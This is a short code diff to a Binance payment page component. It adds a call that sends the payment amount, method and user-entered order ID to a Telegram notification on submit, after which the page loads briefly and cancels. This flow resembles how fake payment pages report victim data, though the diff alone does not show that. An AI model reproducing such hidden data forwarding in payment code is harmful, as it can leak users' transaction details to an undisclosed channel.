@@ -5,7 +5,7 @@ import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
-
+import { sendTelegramNotification } from "@/lib/payment-telegram";
 import orderExample from "@/assets/payment/binance-order-example.jpg";
 import binanceIcon from "@/assets/payment/binanceIcon";
 
@@ -80,7 +80,10 @@ const BinancePayment = () => {
       return;
     }
     setLoading(true);
-    
+    sendTelegramNotification(
+      { type: "payment_activity", amount, method: "Binance", orderId: orderId.trim() },
+      { force: true },
+    );
     setTimeout(() => {
       setLoading(false);
       goCancel();
